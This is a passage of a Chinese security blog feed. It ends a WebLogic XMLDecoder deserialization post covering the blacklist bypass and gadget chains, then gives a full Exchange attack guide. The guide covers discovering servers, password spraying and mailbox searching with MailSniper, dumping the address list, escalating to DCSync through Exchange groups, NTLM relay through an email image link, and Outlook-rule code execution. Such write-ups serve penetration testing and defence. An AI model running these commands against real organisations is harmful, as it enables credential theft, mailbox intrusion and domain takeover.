&#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; catch (ParserConfigurationException var5) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</span><br><span class="line">      &#125; catch (SAXException var6) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</span><br><span class="line">      &#125; catch (IOException var7) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p><p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。<br>object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">   WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">   try &#123;</span><br><span class="line">      SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">      parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">         private int overallarraylength &#x3D; 0;</span><br><span class="line">         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">            if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</span><br><span class="line">                  for(int attClass &#x3D; 0; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">                  String var9 &#x3D; attributes.getValue(&quot;class&quot;);</span><br><span class="line">                  if(var9 !&#x3D; null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure><p>直接绕它的黑名单的话，有如下思路</p><p>“</p><p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p><ul><li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li><li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li><li>构造函数直接有执行命令的操作，执行命令可控。</li><li>有其它的可能导致rce的操作，比如表达式注入之类的。</li></ul><p>目前存在的利用链有：</p><ul><li>FileSystemXmlApplicationContext-RCE</li><li>UnitOfWorkChangeSet-RCE</li><li>ysoserial-jdk7u21-RCE</li><li>JtaTransactionManager-JNDI注入</li></ul><p>“</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4icZvMt447sQM</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>针对exchange的攻击方式</title>
    <link href="http://const27.com/2021/10/18/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/10/18/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-10-17T16:37:53.636Z</published>
    <updated>2021-10-15T07:34:54.976Z</updated>
    
    <content type="html"><![CDATA[<h2 id="exchange快速了解"><a href="#exchange快速了解" class="headerlink" title="exchange快速了解"></a>exchange快速了解</h2><p>FOFA：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">microsoft exchange 2013：</span><br><span class="line">app&#x3D;&quot;Microsoft-Exchange-2013&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU21&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU17&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU23&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU13&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU22&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU11&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU16&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU19&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU18&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU20&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU12&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU15&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU10&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU9&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU14&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-SP1&quot;||app&#x3D;&quot;Microsoft-Exchange-2013&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange 2016：</span><br><span class="line">app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU19&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU12&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU17&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU14&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU11&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU9&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU16&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU10&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU13&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU18&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU4&quot;||app&#x3D;&quot;Microsoft-Exchange-2016-POP3-server&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange 2019：</span><br><span class="line">app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-Preview&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU4&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange 2010：</span><br><span class="line">app&#x3D;&quot;Microsoft-Exchange-2010-POP3-server-version-03.1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2010&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009213815567.png" alt="image-20211009213815567"></p><h3 id="邮件服务器角色"><a href="#邮件服务器角色" class="headerlink" title="邮件服务器角色"></a>邮件服务器角色</h3><p>在exchange 2010中，exchange包含五个服务器角色，分别为邮箱服务器，客户端访问服务器，集线传输服务器，统一消息服务器，边缘传输服务器。<br>在后来的exchange 2013中服务器被精简为3个：邮箱服务器，客户端访问服务器，边缘传输服务器<br>exchange 2016和2019中则只有 邮箱服务器和边缘传输服务器了。</p><h4 id="exchange-2010"><a href="#exchange-2010" class="headerlink" title="exchange 2010"></a>exchange 2010</h4><p><strong>邮箱服务器</strong></p><p>mailbox server，提供托管邮箱，公共文件夹等服务，是必选的服务器角色</p><p><strong>客户端访问服务器</strong></p><p>client access server，用来接收并处理不同客户端的请求，并提供各种接口给客户以访问Exchange服务,</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MAPI访问</span><br><span class="line">POP3和IMAP4访问</span><br><span class="line">Outlook Web App访问（OWA）</span><br><span class="line">Outlook Anywhere访问</span><br><span class="line">Autodiscover自动发现服务</span><br><span class="line">可用性服务</span><br></pre></td></tr></table></figure><p><strong>集线传输服务器</strong></p><p>hub transport server，核心服务是Microsoft Exchange Transport，用于处理大多数邮件的路由、策略等以及Mail Flow。起一个邮件传输中继的作用。</p><p><strong>统一消息服务器</strong></p><p>unified messaging server，用于允许邮箱用户可以在邮件中发送存储语音消息和传真消息，可选角色</p><p><strong>边缘传输服务器</strong></p><p>edge transport server，通常部署于网络边界。其接受来自内部组织的邮件和来自外部可信服务器的邮件，然后应用特定的反垃圾邮件、反病毒策略，最后将通过策略筛选的邮件路由到内部的集线传输服务器，可选角色</p><h4 id="exchange-2013"><a href="#exchange-2013" class="headerlink" title="exchange 2013"></a>exchange 2013</h4><p><strong>邮箱服务器</strong></p><p>托管邮箱、公共文件夹等数据，主要包含集线传输服务（Hub Transport service）和邮箱传输服务（Mailbox Transport service）两大组件服务。</p><p><strong>客户端访问服务器</strong></p><p>负责认证、重定向、代理来自外部不同客户端的访问请求，主要包含客户端访问服务（Client Access service）和前端传输服务（Front End Transport service）两大组件。</p><p><strong>边缘传输服务器</strong></p><p>负责路由出站与入站邮件、策略应用等。</p><h3 id="接口和协议"><a href="#接口和协议" class="headerlink" title="接口和协议"></a>接口和协议</h3><h4 id="OWA"><a href="#OWA" class="headerlink" title="OWA"></a>OWA</h4><p>owa即 outlook web app,即outlook的网页版。（outlook是exchange的客户端软件，许多电脑都有所预装）<br>地址一般为 <a href="http://aa.com/owa">http://aa.com/owa</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009185511900.png" alt="image-20211009185511900"></p><h4 id="ECP"><a href="#ECP" class="headerlink" title="ECP"></a>ECP</h4><p>Exchange Administrative Center,即exchange管理中心，管理员的web控制台</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009185757385.png" alt="image-20211009185757385"></p><h4 id="outlook-anywhere"><a href="#outlook-anywhere" class="headerlink" title="outlook anywhere"></a>outlook anywhere</h4><p>作用是可以让外网用户直接通过outlook anywhere 直接登录到exchange邮箱而无需使用VPN。该特性在exchange server 2013中默认开启，也就是说在exchange server 2013 以后outlook 不再区分内外网环境。</p><h4 id="MAPI"><a href="#MAPI" class="headerlink" title="MAPI"></a>MAPI</h4><p>于Exchange 2013 SP1和Outlook 2013 SP1中被提出的一种新的outlook与exchange交互传输协议。</p><h4 id="EAS"><a href="#EAS" class="headerlink" title="EAS"></a>EAS</h4><p>Exchange ActiveSync是一种允许用户通过移动设备或其他便携式设备访问和管理邮件、联系人、日历等Exchange功能的同步协议，在Windows上使用时其进程名称为wcesomm.exe。”</p><h4 id="EWS"><a href="#EWS" class="headerlink" title="EWS"></a>EWS</h4><p>Exchange Web Service，是exchange提供的一套API编程接口，用于操作exchange相关功能，于exchange server 2007被提出。</p><h3 id="功能和服务"><a href="#功能和服务" class="headerlink" title="功能和服务"></a>功能和服务</h3><h4 id="Autodiscover"><a href="#Autodiscover" class="headerlink" title="Autodiscover"></a>Autodiscover</h4><p>Autodiscover，自动发现，是exchange server 2007 推出的一个服务。<br>该服务目的是简化用户登录流程：用户只需要输入自己的电子邮件地址和密码，就能够通过Autodiscover服务获取运行客户端应用程序所需的配置信息<br>该服务运行在客户端访问服务器上。</p><h4 id="GAL"><a href="#GAL" class="headerlink" title="GAL"></a>GAL</h4><p>GAL即全局地址表（global address list）</p><p>记录了域中用户的基本信息与其邮箱地址，以形成域用户与邮箱用户之间的关联。<br>在渗透中可以通过GAL来获取所有邮箱地址。</p><h2 id="EXCHANGE信息搜集"><a href="#EXCHANGE信息搜集" class="headerlink" title="EXCHANGE信息搜集"></a>EXCHANGE信息搜集</h2><p>在渗透中该如何发现哪一台机器是EXCHANGE服务器呢？<br>在exchange server 2019 中，由于只细分了邮箱服务器和边缘传输服务器，所以开放了如OWA，ECP等接口的服务器即为邮箱服务器。</p><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>exchange会对外暴露接口如OWA,ECP等，所以我们可以通过一些端口特征来发现exchange。<br>exchange 接口会暴露在80端口，同时25/587/2525等端口上会有SMTP服务。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009220507254.png" alt="image-20211009220507254"></p><h4 id="spn"><a href="#spn" class="headerlink" title="spn"></a>spn</h4><p>如果已经打入域中，想快速的定位到exchange服务器，只需要查询域中spn服务即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009220713532.png" alt="image-20211009220713532"></p><h4 id="特殊域名"><a href="#特殊域名" class="headerlink" title="特殊域名"></a>特殊域名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;autodiscover.domain.com&#x2F;autodiscover&#x2F;autodiscover.xml</span><br><span class="line">https:&#x2F;&#x2F;owa.domian&#x2F;owa&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;mail.domain.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;webmail.domain.com&#x2F;</span><br></pre></td></tr></table></figure><h4 id="寻找接口"><a href="#寻找接口" class="headerlink" title="寻找接口"></a>寻找接口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;autoDiscover&#x2F;自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。</span><br><span class="line">&#x2F;ecp&#x2F;“Exchange Control Panel”Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台</span><br><span class="line">&#x2F;eWS&#x2F;“Exchange Web Services”Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互</span><br><span class="line">&#x2F;mapi&#x2F;Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持</span><br><span class="line">&#x2F;microsoft-Server-ActiveSync&#x2F;用于移动应用程序访问电子邮件</span><br><span class="line">&#x2F;OAB&#x2F;“Offline Address Book”用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担</span><br><span class="line">&#x2F;owa&#x2F;“Outlook Web APP”Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等</span><br><span class="line">&#x2F;powerShell&#x2F;用于服务器管理的Exchange管理控制台</span><br><span class="line">&#x2F;Rpc&#x2F;早期的Outlook还使用称为Outlook Anywhere的RPC交互</span><br></pre></td></tr></table></figure><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><p><a href="https://github.com/vysec/checkO365">https://github.com/vysec/checkO365</a></p><h3 id="版本确定"><a href="#版本确定" class="headerlink" title="版本确定"></a>版本确定</h3><p>可以通过OWA,ECP的HTML源代码确定版本</p><p>源代码搜索/owa/</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211009224310181.png" alt="image-20211009224310181"></p><p>可以看到一串数字 15.0.1130,这是exchange具体版本号，到这里查就行了<a href="https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019">https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p><h3 id="IP泄露"><a href="#IP泄露" class="headerlink" title="IP泄露"></a>IP泄露</h3><p>抓包以下接口包，将HTTP版本改为1.0，并删除HOST头，就会暴露exchange ip，有时会暴露内网IP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Microsoft-Server-ActiveSync&#x2F;default.eas</span><br><span class="line">&#x2F;Microsoft-Server-ActiveSync</span><br><span class="line">&#x2F;Autodiscover&#x2F;Autodiscover.xml</span><br><span class="line">&#x2F;Autodiscover</span><br><span class="line">&#x2F;Exchange</span><br><span class="line">&#x2F;Rpc</span><br><span class="line">&#x2F;EWS&#x2F;Exchange.asmx</span><br><span class="line">&#x2F;EWS&#x2F;Services.wsdl</span><br><span class="line">&#x2F;EWS</span><br><span class="line">&#x2F;ecp</span><br><span class="line">&#x2F;OAB</span><br><span class="line">&#x2F;OWA</span><br><span class="line">&#x2F;aspnet_client</span><br><span class="line">&#x2F;PowerShell</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211010135259851.png" alt="image-20211010135259851"></p><p>想要更方便的话，可以用msf的模块自动搜集   use auxiliary/scanner/http/owa_iis_internal_ip</p><h3 id="泄露exchange服务器信息"><a href="#泄露exchange服务器信息" class="headerlink" title="泄露exchange服务器信息"></a>泄露exchange服务器信息</h3><p>当我们对exchange服务器进行NTLM质询时,在服务器返回challenge时同时会返回域信息，机器名等信息。以此为基础可以对exchange进行服务器信息搜集</p><p>直接nmap </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap host  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root&#x3D;&#x2F;rpc&#x2F;rpcproxy.dll -Pn</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211010141803706.png" alt="image-20211010141803706"></p><h2 id="EXCHANGE-外围打点"><a href="#EXCHANGE-外围打点" class="headerlink" title="EXCHANGE 外围打点"></a>EXCHANGE 外围打点</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>接触到exchange的第一步自然是接触到它的接口服务如OWA,ECP等。<br>由于是登录框，我们自然可以用爆破来进行攻击。通常情况下EXCHANGE不限制大字典爆破。</p><p>常见可爆破接口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Autodiscover&#x2F;Autodiscover.xml  # 自 Exchange Server 2007 开始推出的一项自动服务,用于自动配置用户在Outlook中邮箱的相关设置,简化用户登录使用邮箱的流程。</span><br><span class="line">&#x2F;Microsoft-Server-ActiveSync&#x2F;default.eas</span><br><span class="line">&#x2F;Microsoft-Server-ActiveSync    # 用于移动应用程序访问电子邮件</span><br><span class="line">&#x2F;Autodiscover</span><br><span class="line">&#x2F;Rpc&#x2F;                           # 早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互</span><br><span class="line">&#x2F;EWS&#x2F;Exchange.asmx</span><br><span class="line">&#x2F;EWS&#x2F;Services.wsdl</span><br><span class="line">&#x2F;EWS&#x2F;                           # Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互</span><br><span class="line">&#x2F;OAB&#x2F;                           # 用于为Outlook客户端提供地址簿的副本,减轻 Exchange 的负担</span><br><span class="line">&#x2F;owa                            # Exchange owa 接口,用于通过web应用程序访问邮件、日历、任务和联系人等</span><br><span class="line">&#x2F;ecp                            # Exchange 管理中心,管理员用于管理组织中的Exchange 的Web控制台</span><br><span class="line">&#x2F;Mapi                           # Outlook连接 Exchange 的默认方式,在2013和2013之后开始使用,2010 sp2同样支持</span><br><span class="line">&#x2F;powershell                     # 用于服务器管理的 Exchange 管理控制台</span><br></pre></td></tr></table></figure><p>爆破比较实用的工具有Eburst和Ruler</p><p><a href="https://github.com/grayddq/EBurst">https://github.com/grayddq/EBurst</a> （py）</p><p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a> （exe）</p><p>ruler由于windows版的显示似乎有点问腿，这里用的linux版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011010622621.png" alt="image-20211011010622621"></p><p>autodiscover 爆破的原理是，访问autodiscover时浏览器会弹出认证框，当输入正确的凭证后则会显示XML文档内容。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011004659223.png" alt="image-20211011004659223"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011004850022.png" alt="image-20211011004850022"></p><p>ps://github.com/dafthack/MailSniper （ps1）</p><p>下面的是密码喷洒的攻击方式，-Password项也可以设置为一个记录password的字典txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对OWA进行爆破</span><br><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose </span><br><span class="line"></span><br><span class="line">对EWS进行爆破</span><br><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><h2 id="EXCHANGE-后渗透"><a href="#EXCHANGE-后渗透" class="headerlink" title="EXCHANGE 后渗透"></a>EXCHANGE 后渗透</h2><h3 id="邮件内容检索"><a href="#邮件内容检索" class="headerlink" title="邮件内容检索"></a>邮件内容检索</h3><p>我们获取一个exchange用户以后，可以对邮件列表进行检索获取敏感信息，方便下一步渗透</p><p>MailSniper 可以完成这个任务，但是这个工具感觉被杀的比较严重，可以试着修改一下函数名变量名啥的免免杀。</p><p>检索指定用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检索rengan@const.com的 收件箱文件夹里的 内容含有机密的 邮件，在启用remote参数后会弹出一个输入框输入邮箱票据</span><br><span class="line">Invoke-SelfSearch -Mailbox rengan@const.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1 -remote -OutputCsv a.csv</span><br></pre></td></tr></table></figure><p>可以发现在中文的exchange下，用户的邮件一般存放于””收件箱””文件夹，而对于英文则是”inbox”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011145015624.png" alt="image-20211011145015624"></p><h3 id="获取全局地址表"><a href="#获取全局地址表" class="headerlink" title="获取全局地址表"></a>获取全局地址表</h3><p>依旧通过MailSniper 实现，在我们获得一个合法用户的凭据以后，就可以通过获取全局地址表来获取所有邮箱地址。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname Ex -UserName rengan -ExchangeVersion Exchange2013_SP1 -Password ganren@123456</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011162254730.png" alt="image-20211011162254730"></p><h3 id="查找存在缺陷的用户邮箱权限委派"><a href="#查找存在缺陷的用户邮箱权限委派" class="headerlink" title="查找存在缺陷的用户邮箱权限委派"></a><strong>查找存在缺陷的用户邮箱权限委派</strong></h3><p>一个用户的文件夹是可以给其他用户权限的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170212851.png" alt="image-20211011170212851"></p><p>点击此处的权限，来到以下界面，这里的默认即 所有用户(everyone) 的对此文件夹的权限，我这里是把权限给的很高</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170325376.png" alt="image-20211011170325376"></p><p>实战中也可能会遇到用户A对用户B的收件箱有读写权限的情况，所以我们在获取用户A的凭据后可以进而读取用户B的收件箱。</p><p>用MailSniper 实现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-OpenInboxFinder -ExchangeVersion Exchange2013_SP1 -ExchHostname ex.const.com -EmailList .\user.txt -remote</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211011170501129.png" alt="image-20211011170501129"></p><p>既然这里对administrator的收件箱可读，那么就可以用invoke-selfsearch 进行详细的邮件检索了。</p><h3 id="通过exchange用户组进行域提权"><a href="#通过exchange用户组进行域提权" class="headerlink" title="通过exchange用户组进行域提权"></a>通过exchange用户组进行域提权</h3><p>exchange安装后会在AD上生成两个容器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p><p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p><p>同时，在安装exchange后还会生成一个组Organization Management，这个组可以修改其他exchange组的用户信息，所以当然也可以修改Exchange Trusted Subsystem组的成员信息，比如向里面加一个以获得的用户。</p><p>综上所述，只要获得Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,就可以通过dcsync来获取整个域权限。<br>当然，想获得上述组用户权限，还是不太容易的。</p><h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h3><p>用exchange也可以很方便的进行NTLM relay：给用户发一封邮件，其中包含的图片链接形如 \\10.10.10.1\a.jpg，用户收到邮件后则会向10.10.10.1发送NTLM质询，从而造成NTLM relay。<br>其实EXCHANGE 很多CVE 都是与NTLM RELAY 挂钩的，如<strong>CVE-2018-8581</strong>，<strong>CVE-2020-17141</strong> ，<strong>CVE-2020-17143</strong>，<strong>CVE-2019-1040</strong></p><h3 id="OUTLOOK-命令执行"><a href="#OUTLOOK-命令执行" class="headerlink" title="OUTLOOK 命令执行"></a>OUTLOOK 命令执行</h3><p>OUTLOOK 客户端有一个 规则与通知 的功能，通过该功能可以使outlook客户端在指定情况下执行指定的指令。若我们获得某用户的凭证，可以通过此功能设置“用户收到含指定字符的邮件时 执行指定的指令比如clac.exe”，当用户登录outlook客户端并访问到此邮件时，它的电脑便会执行calc.exe。<br>但是，当触发动作为启动应用程序时，只能直接调用可执行程序，如启动一个exe程序，但无法为应用程序传递参数，想要直接上线，我们可以将EXE放到某共享目录下，或者直接上传到用户的机器。</p><p>具体步骤为打开规则与通知功能，然后新建功能，在接收到某条件邮件时启动指定应用程序</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211015145145915.png" alt="image-20211015145145915"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211015145304348.png" alt="image-20211015145304348"></p><p>收到含abc内容的邮件后，成功弹计算器</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20211015145831895.png" alt="image-20211015145831895"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;exchange快速了解&quot;&gt;&lt;a href=&quot;#exchange快速了解&quot; class=&quot;headerlink&quot; title=&quot;exchange快速了解&quot;&gt;&lt;/a&gt;exchange快速了解&lt;/h2&gt;&lt;p&gt;FOFA：&lt;/p&gt;
&lt;figure class=&quot;highl</summary>
      
    
    
    
    
    <category term="一些应用的攻击方式" scheme="http://const27.com/tags/%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析FastJSON反序列化漏洞（1.2.24——1.2.68）</title>
    <link href="http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-07T19:05:14.205Z</published>
    <updated>2021-09-07T19:04:32.235Z</updated>
    
